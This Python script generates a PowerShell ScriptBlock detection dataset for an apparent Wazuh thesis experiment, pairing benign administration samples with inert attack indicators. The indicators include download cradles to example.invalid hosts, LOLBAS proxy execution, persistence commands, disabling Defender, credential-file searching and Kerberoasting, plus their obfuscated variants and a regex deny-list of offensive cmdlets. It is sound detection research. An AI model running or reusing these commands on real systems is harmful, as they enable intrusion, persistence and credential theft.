#!/usr/bin/env python3
"""Generate the synthetic, curated ScriptBlock dataset used in the experiment.

The 30 positive behavior templates are defined locally in this file. Public
defensive sources provide the technique taxonomy and conceptual references; the
generator does not import complete scripts, C2 implants, or payload files from
those sources. Every positive case is non-executable: it never contacts a live
endpoint, downloads a payload, changes security settings, creates persistence, or
executes reconstructed content. The Windows runner only emits these indicators so
ScriptBlock Logging and Wazuh can observe their lexical form.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import random
import re
from collections import Counter
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any


SEED = 20260711
ACCESSED = "2026-07-11"
SOURCE_MANIFEST: dict[str, dict[str, Any]] = {
    "mitre_attack": {
        "title": "MITRE ATT&CK Enterprise",
        "url": "https://attack.mitre.org/",
        "accessed": ACCESSED,
    },
    "atomic_red_team": {
        "title": "Atomic Red Team",
        "url": "https://github.com/redcanaryco/atomic-red-team",
        "commit": "94153597065a5cb453168ae177f48c9d30e89edb",
        "accessed": ACCESSED,
    },
    "invoke_obfuscation": {
        "title": "Invoke-Obfuscation",
        "url": "https://github.com/danielbohannon/Invoke-Obfuscation",
        "commit": "f20e7f843edd0a3a7716736e9eddfa423395dd26",
        "accessed": ACCESSED,
    },
    "sigma": {
        "title": "Sigma main rule repository",
        "url": "https://github.com/SigmaHQ/sigma",
        "commit": "282369fa76c5cd6103b055478fbaebec8530cfa5",
        "accessed": ACCESSED,
    },
    "lolbas": {
        "title": "LOLBAS",
        "url": "https://github.com/LOLBAS-Project/LOLBAS",
        "commit": "a2784c79091cb282fefb68f0056a853cfafd7e3c",
        "accessed": ACCESSED,
    },
    "microsoft_powershell": {
        "title": "Microsoft PowerShell documentation",
        "url": "https://learn.microsoft.com/powershell/",
        "accessed": ACCESSED,
    },
    "wazuh_powershell_guidance": {
        "title": "Detecting PowerShell exploitation techniques in Windows using Wazuh",
        "url": (
            "https://wazuh.com/blog/"
            "detecting-powershell-exploitation-techniques-in-windows-using-wazuh/"
        ),
        "accessed": ACCESSED,
    },
    "wazuh_installed_rules": {
        "title": "Installed Wazuh PowerShell standard rules",
        "path": "/var/ossec/ruleset/rules/0915-win-powershell_rules.xml",
        "server_version": "4.14.5-rc1",
        "agent_version": "4.14.4",
        "sha256": "b358b3c4dd597fde075e7749401feff78728431f9e24c77a3c01399cac10739f",
        "accessed": ACCESSED,
    },
}


@dataclass(frozen=True)
class Behavior:
    family: str
    indicator: str
    tactic: str
    technique: str
    mitre_ids: tuple[str, ...]
    source_ids: tuple[str, ...]
    provenance: str


def mitre_url(technique_id: str) -> str:
    parts = technique_id.split(".", 1)
    if len(parts) == 2:
        return f"https://attack.mitre.org/techniques/{parts[0]}/{parts[1]}/"
    return f"https://attack.mitre.org/techniques/{technique_id}/"


ATOMIC_T1059 = (
    "https://github.com/redcanaryco/atomic-red-team/blob/"
    "94153597065a5cb453168ae177f48c9d30e89edb/"
    "atomics/T1059.001/T1059.001.md"
)
INVOKE_OBFUSCATION = (
    "https://github.com/danielbohannon/Invoke-Obfuscation/tree/"
    "f20e7f843edd0a3a7716736e9eddfa423395dd26"
)


BEHAVIORS: tuple[Behavior, ...] = (
    Behavior(
        "encoded_command",
        "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA",
        "Execution",
        "PowerShell",
        ("T1059.001", "T1027.010"),
        ("mitre_attack", "atomic_red_team"),
        "PowerShell launcher flags with a real UTF-16LE Base64 value that decodes only to a harmless THESIS-INERT output command.",
    ),
    Behavior(
        "downloadstring_iex",
        "IEX (New-Object Net.WebClient).DownloadString('https://stage.example.invalid/bootstrap.ps1')",
        "Command and Control",
        "Ingress Tool Transfer",
        ("T1059.001", "T1105"),
        ("atomic_red_team", "wazuh_powershell_guidance"),
        "Download-cradle syntax with a reserved non-resolving domain.",
    ),
    Behavior(
        "invoke_webrequest_outfile",
        "Invoke-WebRequest -Uri 'https://files.example.invalid/update.bin' -OutFile '$env:TEMP\\update.bin'",
        "Command and Control",
        "Ingress Tool Transfer",
        ("T1105", "T1071.001"),
        ("mitre_attack", "atomic_red_team"),
        "Web transfer command with reserved destination and no execution.",
    ),
    Behavior(
        "invoke_restmethod_post",
        "Invoke-RestMethod -Method Post -Uri 'https://api.example.invalid/checkin' -Body @{host='WS-01';user='analyst';status='ok'}",
        "Exfiltration",
        "Exfiltration Over C2 Channel",
        ("T1041", "T1071.001"),
        ("mitre_attack", "sigma"),
        "HTTP POST shape with representative inert host metadata and a reserved endpoint.",
    ),
    Behavior(
        "proxy_aware_webclient",
        "$wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::DefaultWebProxy; $wc.Headers['User-Agent']='Mozilla/5.0'; $wc.DownloadString('https://cdn.example.invalid/a')",
        "Command and Control",
        "Web Protocols",
        ("T1071.001", "T1105"),
        ("mitre_attack", "atomic_red_team"),
        "Proxy-aware WebClient vocabulary with a reserved endpoint.",
    ),
    Behavior(
        "msxml_com_download",
        "$x=New-Object -ComObject MsXml2.ServerXmlHttp; $x.Open('GET','https://xml.example.invalid/task',$false); $x.Send(); IEX $x.ResponseText",
        "Execution",
        "PowerShell",
        ("T1059.001", "T1105"),
        ("atomic_red_team",),
        "MSXML COM download-cradle shape; represented only as emitted text.",
    ),
    Behavior(
        "dns_txt_channel",
        "Resolve-DnsName -Type TXT -Name 'task.example.invalid' | Select-Object -ExpandProperty Strings",
        "Command and Control",
        "DNS",
        ("T1071.004",),
        ("mitre_attack", "atomic_red_team"),
        "DNS TXT query shape using a reserved domain.",
    ),
    Behavior(
        "tcpclient_stream_partial",
        "$client=New-Object System.Net.Sockets.TcpClient('203.0.113.77',4444); $stream=$client.GetStream(); $buffer=New-Object byte[] 4096; $read=$stream.Read($buffer,0,$buffer.Length)",
        "Command and Control",
        "Non-Application Layer Protocol",
        ("T1095",),
        ("mitre_attack", "sigma"),
        "TcpClient stream-read shape with an IANA TEST-NET address; represented only as emitted text.",
    ),
    Behavior(
        "http_beacon_profile",
        "$profile=@{Sleep=60000;Jitter=0.25;UserAgent='Mozilla/5.0';Uri='/api/v1/status'}; Invoke-WebRequest -Uri 'https://c2.example.invalid/api/v1/status'",
        "Command and Control",
        "Web Protocols",
        ("T1071.001",),
        ("mitre_attack", "sigma"),
        "Generic beacon-profile vocabulary without framework code or live endpoint.",
    ),
    Behavior(
        "bits_transfer",
        "Start-BitsTransfer -Source 'https://bits.example.invalid/payload.bin' -Destination '$env:TEMP\\cache.bin'",
        "Defense Evasion",
        "BITS Jobs",
        ("T1197", "T1105"),
        ("mitre_attack", "lolbas"),
        "BITS transfer shape with a reserved endpoint.",
    ),
    Behavior(
        "certutil_transfer_decode",
        "certutil.exe -urlcache -split -f https://cert.example.invalid/blob.txt C:\\__THESIS_INERT__\\blob.txt; certutil.exe -decode C:\\__THESIS_INERT__\\blob.txt C:\\__THESIS_INERT__\\stage.bin",
        "Defense Evasion",
        "Deobfuscate/Decode Files or Information",
        ("T1140", "T1105"),
        ("mitre_attack", "lolbas"),
        "Certutil transfer/decode vocabulary with inert paths and reserved endpoint.",
    ),
    Behavior(
        "mshta_proxy_execution",
        "mshta.exe javascript:a=GetObject('script:https://hta.example.invalid/a.sct').Exec();close()",
        "Defense Evasion",
        "Mshta",
        ("T1218.005",),
        ("lolbas", "wazuh_powershell_guidance"),
        "LOLBAS mshta syntax with a reserved endpoint.",
    ),
    Behavior(
        "regsvr32_proxy_execution",
        "regsvr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scrobj.dll",
        "Defense Evasion",
        "Regsvr32",
        ("T1218.010",),
        ("lolbas", "mitre_attack"),
        "LOLBAS regsvr32 syntax with a reserved endpoint.",
    ),
    Behavior(
        "rundll32_proxy_execution",
        "rundll32.exe C:\\__THESIS_INERT__\\stage.dll,EntryPoint",
        "Defense Evasion",
        "Rundll32",
        ("T1218.011",),
        ("lolbas", "mitre_attack"),
        "LOLBAS rundll32 command shape with an inert placeholder path.",
    ),
    Behavior(
        "scheduled_task_persistence",
        "Register-ScheduledTask -TaskName 'UpdateCheck' -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA')",
        "Persistence",
        "Scheduled Task/Job: Scheduled Task",
        ("T1053.005",),
        ("mitre_attack", "atomic_red_team"),
        "Scheduled-task persistence shape whose encoded argument decodes only to a harmless THESIS-INERT output command; emitted as text only.",
    ),
    Behavior(
        "registry_run_key",
        "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'UpdateCheck' -Value 'powershell.exe -WindowStyle Hidden -File C:\\__THESIS_INERT__\\stage.ps1'",
        "Persistence",
        "Registry Run Keys / Startup Folder",
        ("T1547.001",),
        ("mitre_attack", "atomic_red_team"),
        "Run-key persistence shape; no registry write is executed.",
    ),
    Behavior(
        "powershell_remoting",
        "Invoke-Command -ComputerName 'host.example.invalid' -ScriptBlock { powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA }",
        "Lateral Movement",
        "Windows Remote Management",
        ("T1021.006", "T1059.001"),
        ("mitre_attack", "atomic_red_team"),
        "PowerShell remoting vocabulary with a reserved hostname.",
    ),
    Behavior(
        "powershell_history_clear",
        "Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -Force",
        "Defense Evasion",
        "Clear Command History",
        ("T1070.003",),
        ("mitre_attack", "sigma"),
        "PowerShell and PSReadLine history-clearing command shape; represented only as emitted text.",
    ),
    Behavior(
        "defender_exclusion",
        "Set-MpPreference -ExclusionPath 'C:\\__THESIS_INERT__' -DisableRealtimeMonitoring $true",
        "Defense Evasion",
        "Impair Defenses",
        ("T1562.001",),
        ("mitre_attack", "sigma"),
        "Defender-modification vocabulary; emitted as text only.",
    ),
    Behavior(
        "reflection_load_partial",
        "[Reflection.Assembly]::Load([Convert]::FromBase64String('VEhFU0lTLUlORVJULURVTU1Z'))",
        "Defense Evasion",
        "Reflective Code Loading",
        ("T1620", "T1140"),
        ("mitre_attack", "atomic_red_team"),
        "Reflective-load shape with Base64 that decodes to non-assembly THESIS-INERT-DUMMY bytes.",
    ),
    Behavior(
        "add_type_native_api_partial",
        "Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr OpenProcess(uint access, bool inherit, int processId);' -Name NativeMethods -Namespace Thesis.Inert",
        "Execution",
        "Native API",
        ("T1106",),
        ("mitre_attack", "sigma"),
        "Complete P/Invoke declaration without a native API call; represented only as emitted text.",
    ),
    Behavior(
        "credential_file_search",
        "Get-ChildItem -Path 'C:\\Users' -Recurse -Include '*.config','*.xml' | Select-String -Pattern 'password|token|secret'",
        "Credential Access",
        "Credentials In Files",
        ("T1552.001",),
        ("mitre_attack", "atomic_red_team"),
        "Credential-search command shape; represented only as emitted text.",
    ),
    Behavior(
        "kerberoast_indicator",
        "Invoke-Kerberoast -OutputFormat Hashcat | Select-Object SamAccountName,Hash",
        "Credential Access",
        "Kerberoasting",
        ("T1558.003",),
        ("mitre_attack", "atomic_red_team"),
        "Kerberoasting command vocabulary without imported offensive module.",
    ),
    Behavior(
        "clipboard_collection",
        "Get-Clipboard -Raw | ConvertTo-Json -Compress",
        "Collection",
        "Clipboard Data",
        ("T1115",),
        ("mitre_attack", "sigma"),
        "Clipboard-collection vocabulary; emitted as text only.",
    ),
    Behavior(
        "screen_capture",
        "[System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)",
        "Collection",
        "Screen Capture",
        ("T1113",),
        ("mitre_attack", "sigma"),
        "Screen-capture API vocabulary with no bitmap object or invocation.",
    ),
    Behavior(
        "archive_collection",
        "Get-ChildItem '$env:USERPROFILE\\Documents' -Recurse | Compress-Archive -DestinationPath '$env:TEMP\\collect.zip'",
        "Collection",
        "Archive Collected Data",
        ("T1560.001",),
        ("mitre_attack", "atomic_red_team"),
        "Archive-collection command shape; emitted as text only.",
    ),
    Behavior(
        "process_discovery",
        "Get-Process | Select-Object Name,Id,Path",
        "Discovery",
        "Process Discovery",
        ("T1057",),
        ("mitre_attack", "wazuh_installed_rules"),
        "Discovery command intentionally overlaps legitimate administration.",
    ),
    Behavior(
        "recursive_file_discovery",
        "Get-ChildItem 'C:\\Users' -Recurse -Force -ErrorAction SilentlyContinue",
        "Discovery",
        "File and Directory Discovery",
        ("T1083",),
        ("mitre_attack", "wazuh_installed_rules"),
        "File-discovery command intentionally overlaps legitimate administration.",
    ),
    Behavior(
        "registry_discovery",
        "Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'",
        "Discovery",
        "Query Registry",
        ("T1012",),
        ("mitre_attack", "wazuh_installed_rules"),
        "Registry discovery intentionally overlaps legitimate administration.",
    ),
    Behavior(
        "dynamic_invocation_partial",
        "$cmd=('Inv'+'oke-Expression'); & (Get-Command $cmd) \"Write-Output 'THESIS-INERT'\"",
        "Execution",
        "PowerShell",
        ("T1059.001", "T1027.010"),
        ("atomic_red_team", "invoke_obfuscation"),
        "Dynamic invocation shape whose nested command only emits a harmless THESIS-INERT marker.",
    ),
)


OBFUSCATION_TYPES = (
    "base64_literal_decode_safe",
    "string_concatenation",
    "backtick_literal",
    "mixed_case",
    "alias_command_reconstruction",
    "combined_obfuscation",
)

STRING_LITERAL_RE = re.compile(
    r"'(?P<single>(?:''|[^'])*)'|\"(?P<double>(?:`.|[^\"`])*)\"",
    re.S,
)
FORBIDDEN_ACTIVE_POSITIVE_RE = re.compile(
    r"(?i)(?:\bIEX\b|Invoke-Expression|Invoke-WebRequest|Invoke-RestMethod|"
    r"DownloadString|TcpClient|Start-BitsTransfer|\bcertutil(?:\.exe)?\b|"
    r"\bmshta(?:\.exe)?\b|\bregsvr32(?:\.exe)?\b|\brundll32(?:\.exe)?\b|"
    r"Register-ScheduledTask|New-ItemProperty|Invoke-Command|Set-MpPreference|"
    r"Assembly\]::Load|CreateThread|Get-ChildItem|Invoke-Kerberoast|Get-Clipboard|"
    r"CopyFromScreen|Compress-Archive|Get-Process|Get-ItemProperty|&\s*\()"
)


def ps_quote(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def stable_seed(value: str) -> int:
    return int(hashlib.sha256(value.encode("utf-8")).hexdigest()[:16], 16)


def mixed_case(value: str, key: str) -> str:
    rng = random.Random(stable_seed("mixed:" + key))
    return "".join(
        char.upper() if char.isalpha() and rng.random() < 0.5 else char.lower()
        if char.isalpha()
        else char
        for char in value
    )


def backtick_text(value: str, key: str) -> str:
    rng = random.Random(stable_seed("backtick:" + key))

    def transform(match: re.Match[str]) -> str:
        token = match.group(0)
        if len(token) < 6 or rng.random() < 0.35:
            return token
        positions = list(range(2, len(token) - 1))
        rng.shuffle(positions)
        selected = set(positions[: max(1, min(2, len(token) // 6))])
        return "".join(("`" if index in selected else "") + char for index, char in enumerate(token))

    return re.sub(r"[A-Za-z]{4,}", transform, value)


def split_chunks(value: str, key: str, minimum: int = 5, maximum: int = 10) -> list[str]:
    rng = random.Random(stable_seed("chunks:" + key))
    chunks: list[str] = []
    cursor = 0
    target = max(minimum, min(maximum, len(value) // 12 + 4))
    while cursor < len(value):
        remaining = len(value) - cursor
        chunks_left = max(1, target - len(chunks))
        size = max(3, min(24, remaining // chunks_left + rng.randint(-3, 3)))
        chunks.append(value[cursor : cursor + size])
        cursor += size
    return [chunk for chunk in chunks if chunk]


def clear_core(indicator: str) -> str:
    return f"$indicator={ps_quote(indicator)}; Write-Output $indicator"


def obfuscated_core(indicator: str, obfuscation_type: str, key: str) -> str:
    if obfuscation_type == "base64_literal_decode_safe":
        encoded = base64.b64encode(indicator.encode("utf-16le")).decode("ascii")
        return (
            f"$encoded={ps_quote(encoded)}; "
            "$indicator=[Text.Encoding]::Unicode.GetString("
            "[Convert]::FromBase64String($encoded)); Write-Output $indicator"
        )
    if obfuscation_type == "string_concatenation":
        chunks = split_chunks(indicator, key)
        expression = " + ".join(ps_quote(chunk) for chunk in chunks)
        return f"$indicator={expression}; Write-Output $indicator"
    if obfuscation_type == "backtick_literal":
        return clear_core(backtick_text(indicator, key))
    if obfuscation_type == "mixed_case":
        return clear_core(mixed_case(indicator, key))
    if obfuscation_type == "alias_command_reconstruction":
        chunks = split_chunks(indicator, key, minimum=6, maximum=12)
        values = ",".join(ps_quote(chunk) for chunk in chunks)
        return (
            f"$parts=@({values}); $indicator=[string]::Concat($parts); "
            "Write-Output $indicator"
        )
    if obfuscation_type == "combined_obfuscation":
        transformed = backtick_text(mixed_case(indicator, key), key)
        chunks = split_chunks(transformed, key, minimum=6, maximum=12)
        values = ",".join(ps_quote(chunk) for chunk in chunks)
        return f"$parts=@({values}); $indicator=($parts -join ''); Write-Output $indicator"
    raise ValueError(f"Unknown obfuscation type: {obfuscation_type}")


def extract_benign_core(scriptblock: str) -> str:
    text = re.sub(
        r"^\s*\$sampleId\s*=\s*'[^']+'\s*;\s*(?:\$scenario\s*=\s*'[^']+'\s*;\s*)?",
        "",
        scriptblock,
        count=1,
        flags=re.I,
    )
    text = re.sub(
        r";\s*Write-Output\s*\(\s*\"WAZUH_SAMPLE.*$",
        "",
        text,
        count=1,
        flags=re.I | re.S,
    )
    if "WAZUH_SAMPLE" in text:
        raise ValueError("Failed to remove instrumentation marker")
    return text.strip().rstrip(";")


def neutral_wrapper(sample_id: str, core: str) -> str:
    return (
        f"$sampleId={ps_quote(sample_id)}; {core.strip().rstrip(';')}; "
        'Write-Output ("WAZUH_SAMPLE {0}" -f $sampleId)'
    )


def source_urls(source_ids: tuple[str, ...], mitre_ids: tuple[str, ...]) -> list[str]:
    urls = [mitre_url(value) for value in mitre_ids]
    for source_id in source_ids:
        source = SOURCE_MANIFEST[source_id]
        if "url" in source:
            urls.append(str(source["url"]))
    return list(dict.fromkeys(urls))


def build_benign(source_path: Path) -> list[dict[str, Any]]:
    rows = json.loads(source_path.read_text(encoding="utf-8"))
    benign = [row for row in rows if row.get("label") == "benign"]
    if len(benign) != 150:
        raise ValueError(f"Expected 150 benign samples, found {len(benign)}")

    output: list[dict[str, Any]] = []
    seen_cores: set[str] = set()
    for row in benign:
        scenario = str(row["scenario"])
        family = re.sub(r"_v[12]$", "", scenario)
        core = extract_benign_core(str(row["scriptblock"]))
        if family == "process_cpu_sort_normal":
            core = (
                "Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | "
                "Select-Object -First 3 Name,Id"
            )
        elif family == "hard_eventlog_query_filter":
            core = (
                "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} "
                "-MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated"
            )
        normalized_core = re.sub(r"\s+", " ", core).strip().lower()
        if normalized_core in seen_cores:
            core = f"$result=& {{ {core} }}; $result | Out-String | Write-Output"
            normalized_core = re.sub(r"\s+", " ", core).strip().lower()
        seen_cores.add(normalized_core)
        output.append(
            {
                "schema_version": 5,
                "label": "benign",
                "class_id": 0,
                "dataset_group": row.get("dataset_group", "normal_benign"),
                "scenario": scenario,
                "behavior_family": family,
                "evaluation_group": f"benign:{family}",
                "tactic": "Benign Administration",
                "technique": "Legitimate PowerShell administration",
                "mitre_attack_id": "N/A",
                "mitre_attack_ids": [],
                "obfuscation_type": "none",
                "analysis_text": core,
                "safety_class": "benign_safe_execution",
                "execution_behavior": "read_only_or_local_formatting",
                "network_effect": "none",
                "persistence_effect": "none",
                "source_family": "Microsoft PowerShell administrative examples",
                "source_snapshot_ids": ["microsoft_powershell"],
                "source_reference_urls": [
                    "https://learn.microsoft.com/powershell/",
                    "https://learn.microsoft.com/powershell/scripting/samples/sample-scripts-for-administration",
                ],
                "provenance_notes": (
                    "Retained from the curated v4 benign class; instrumentation is "
                    "neutralized and the behavior family is preserved for grouped evaluation."
                ),
                "expected_signal": "legitimate_or_challenging_benign_scriptblock",
            }
        )
    return output


def build_positive() -> list[dict[str, Any]]:
    output: list[dict[str, Any]] = []
    for behavior in BEHAVIORS:
        output.append(
            {
                "schema_version": 5,
                "label": "simulated_malicious",
                "class_id": 1,
                "dataset_group": "clear_indicator",
                "scenario": f"{behavior.family}_clear",
                "behavior_family": behavior.family,
                "evaluation_group": f"positive:{behavior.family}",
                "tactic": behavior.tactic,
                "technique": behavior.technique,
                "mitre_attack_id": behavior.mitre_ids[0],
                "mitre_attack_ids": list(behavior.mitre_ids),
                "obfuscation_type": "none",
                "analysis_text": clear_core(behavior.indicator),
                "original_indicator": behavior.indicator,
                "safety_class": "simulated_malicious_non_executable",
                "execution_behavior": "emit_indicator_only",
                "network_effect": "none_reserved_endpoints_not_contacted",
                "persistence_effect": "none_command_text_not_invoked",
                "source_family": "Source-derived inert offensive behavior pattern",
                "source_snapshot_ids": list(behavior.source_ids),
                "source_reference_urls": source_urls(behavior.source_ids, behavior.mitre_ids),
                "provenance_notes": behavior.provenance,
                "expected_signal": "clear_source_derived_attack_indicator",
            }
        )

    for family_index, behavior in enumerate(BEHAVIORS):
        selected = [
            OBFUSCATION_TYPES[(family_index + offset) % len(OBFUSCATION_TYPES)]
            for offset in range(4)
        ]
        for obfuscation_type in selected:
            key = f"{behavior.family}:{obfuscation_type}"
            transform_indicator = behavior.indicator
            output.append(
                {
                    "schema_version": 5,
                    "label": "simulated_malicious",
                    "class_id": 1,
                    "dataset_group": "obfuscated_indicator",
                    "scenario": f"{behavior.family}_{obfuscation_type}",
                    "behavior_family": behavior.family,
                    "evaluation_group": f"positive:{behavior.family}",
                    "tactic": behavior.tactic,
                    "technique": behavior.technique,
                    "mitre_attack_id": behavior.mitre_ids[0],
                    "mitre_attack_ids": list(behavior.mitre_ids),
                    "obfuscation_type": obfuscation_type,
                    "analysis_text": obfuscated_core(
                        transform_indicator, obfuscation_type, key
                    ),
                    "original_indicator": behavior.indicator,
                    "safety_class": "simulated_malicious_non_executable",
                    "execution_behavior": (
                        "decode_and_emit_only"
                        if obfuscation_type == "base64_literal_decode_safe"
                        else "reconstruct_and_emit_only"
                    ),
                    "network_effect": "none_reserved_endpoints_not_contacted",
                    "persistence_effect": "none_command_text_not_invoked",
                    "source_family": "Source-derived inert offensive behavior pattern",
                    "source_snapshot_ids": list(
                        dict.fromkeys((*behavior.source_ids, "invoke_obfuscation"))
                    ),
                    "source_reference_urls": list(
                        dict.fromkeys(
                            [
                                *source_urls(behavior.source_ids, behavior.mitre_ids),
                                INVOKE_OBFUSCATION,
                            ]
                        )
                    ),
                    "provenance_notes": (
                        behavior.provenance
                        + " Obfuscation category derived from Invoke-Obfuscation taxonomy; "
                        "the transformed text remains non-executable."
                    ),
                    "expected_signal": "obfuscated_source_derived_attack_indicator",
                }
            )
    return output


def finalize_rows(rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
    if len(rows) != 300:
        raise ValueError(f"Expected 300 rows, found {len(rows)}")
    rng = random.Random(SEED)
    rng.shuffle(rows)
    for index, row in enumerate(rows, start=1):
        sample_id = f"PST-{index:03d}"
        row["id"] = sample_id
        row["scriptblock"] = neutral_wrapper(sample_id, str(row["analysis_text"]))
        row["indicator_sha256"] = hashlib.sha256(
            str(row.get("original_indicator", row["analysis_text"])).encode("utf-8")
        ).hexdigest()
        row["instrumentation"] = "neutral_id_and_terminal_WAZUH_SAMPLE_marker"
    return rows


def validate(rows: list[dict[str, Any]]) -> dict[str, Any]:
    ids = [str(row["id"]) for row in rows]
    labels = Counter(str(row["label"]) for row in rows)
    groups = Counter(str(row["dataset_group"]) for row in rows)
    obfuscations = Counter(str(row["obfuscation_type"]) for row in rows)
    evaluation_groups: dict[str, set[str]] = {}
    errors: list[str] = []

    if len(ids) != len(set(ids)):
        errors.append("sample IDs are not unique")
    if labels != Counter({"benign": 150, "simulated_malicious": 150}):
        errors.append(f"unexpected label distribution: {dict(labels)}")
    expected_groups = Counter(
        {
            "normal_benign": 100,
            "hard_benign": 50,
            "clear_indicator": 30,
            "obfuscated_indicator": 120,
        }
    )
    if groups != expected_groups:
        errors.append(f"unexpected dataset groups: {dict(groups)}")
    expected_obfuscations = Counter({"none": 180, **{name: 20 for name in OBFUSCATION_TYPES}})
    if obfuscations != expected_obfuscations:
        errors.append(f"unexpected obfuscation distribution: {dict(obfuscations)}")

    for row in rows:
        sample_id = str(row["id"])
        scriptblock = str(row["scriptblock"])
        if scriptblock.count("WAZUH_SAMPLE {0}") != 1 or scriptblock.count(sample_id) != 1:
            errors.append(f"{sample_id}: expected one neutral marker and one ID assignment")
        for leaked in (
            str(row["scenario"]),
            str(row["dataset_group"]),
            str(row["behavior_family"]),
        ):
            if leaked and leaked.lower() in scriptblock.lower():
                errors.append(f"{sample_id}: metadata leaked into ScriptBlock: {leaked}")
        evaluation_groups.setdefault(str(row["evaluation_group"]), set()).add(
            str(row["label"])
        )
        if row["label"] == "simulated_malicious":
            if row["safety_class"] != "simulated_malicious_non_executable":
                errors.append(f"{sample_id}: invalid positive safety class")
            if "WAZUH_SAMPLE" in str(row["analysis_text"]):
                errors.append(f"{sample_id}: marker leaked into analysis text")
            unquoted = STRING_LITERAL_RE.sub("''", str(row["analysis_text"]))
            active_match = FORBIDDEN_ACTIVE_POSITIVE_RE.search(unquoted)
            if active_match:
                errors.append(
                    f"{sample_id}: positive core contains active command outside a literal: "
                    f"{active_match.group(0)}"
                )
            url_view = str(row.get("original_indicator", row["analysis_text"]))
            for url in re.findall(r"https?://[^\s'\"]+", url_view, re.I):
                if not any(value in url.lower() for value in ("example.invalid",)):
                    errors.append(f"{sample_id}: non-reserved URL in positive core: {url}")
    mixed_groups = [name for name, values in evaluation_groups.items() if len(values) != 1]
    if mixed_groups:
        errors.append(f"evaluation groups mix labels: {mixed_groups}")

    raw_analysis = [re.sub(r"\s+", " ", str(row["analysis_text"])).strip() for row in rows]
    normalized = [value.lower() for value in raw_analysis]
    summary = {
        "schema_version": 5,
        "seed": SEED,
        "sample_count": len(rows),
        "label_counts": dict(labels),
        "dataset_group_counts": dict(groups),
        "obfuscation_counts": dict(obfuscations),
        "evaluation_group_count": len(evaluation_groups),
        "unique_ids": len(set(ids)),
        "unique_scriptblocks": len({str(row["scriptblock"]) for row in rows}),
        "unique_analysis_texts": len(set(raw_analysis)),
        "unique_casefolded_analysis_texts": len(set(normalized)),
        "errors": errors,
    }
    if errors:
        raise ValueError("Dataset validation failed:\n- " + "\n- ".join(errors[:30]))
    return summary


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--benign-source", type=Path, required=True)
    parser.add_argument("--out", type=Path, required=True)
    parser.add_argument("--manifest-out", type=Path)
    parser.add_argument("--summary-out", type=Path)
    args = parser.parse_args()

    rows = finalize_rows([*build_benign(args.benign_source), *build_positive()])
    summary = validate(rows)

    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_text(json.dumps(rows, indent=2, ensure_ascii=False), encoding="utf-8")
    manifest_path = args.manifest_out or args.out.with_name("source_manifest.json")
    manifest_path.write_text(
        json.dumps(SOURCE_MANIFEST, indent=2, ensure_ascii=False), encoding="utf-8"
    )
    summary_path = args.summary_out or args.out.with_name("dataset_summary.json")
    summary["dataset_sha256"] = hashlib.sha256(args.out.read_bytes()).hexdigest()
    summary["source_manifest_sha256"] = hashlib.sha256(manifest_path.read_bytes()).hexdigest()
    summary_path.write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
